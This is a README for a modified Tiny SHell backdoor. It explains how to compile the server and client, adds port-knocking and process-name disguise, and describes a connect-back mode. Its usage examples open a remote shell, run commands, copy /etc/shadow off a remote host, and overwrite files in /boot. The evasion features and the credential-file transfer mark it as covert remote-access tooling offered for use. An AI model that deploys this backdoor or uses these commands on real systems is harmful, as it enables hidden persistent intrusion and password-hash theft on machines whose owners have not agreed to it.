#TinyShell

##What's new

* add udp knock, expose tcp port after right knock
* add process name confusion

based on https://github.com/infodox/tsh-sctp

modified by md5_salt

##Ussage
* Compiling Tiny SHell

    Run "make <system>", where <system> can be any one of these:
    linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf

* How to use the server

    It can be useful to set $HOME and the file creation mask
    before starting the server:

        % umask 077; HOME=/var/tmp ./tshd

* How to use the client

    Make sure tshd is running on the remote host. You can:

    - start a shell:

        ./tsh <hostname>

    - execute a command:

        ./tsh <hostname> "uname -a"

    - transfer files:

        ./tsh <hostname> get /etc/shadow .
        ./tsh <hostname> put vmlinuz /boot

    Note: if the server runs in connect-back mode, replace
    the remote machine hostname with "cb".

* About multiple file transfers

    At the moment, Tiny SHell does not support scp-like multiple
    and/or recursive file transfers. You can work around this bug
    by simply making a tar archive and transferring it. Example:

    ./tsh host "stty raw; tar -cf - /etc 2>/dev/null" | tar -xvf -


    On some brain-dead systems (actually, IRIX and HP-UX), Ctrl-C
    and other control keys do not work correctly. Fix it with:

        % stty intr "^C" erase "^H" eof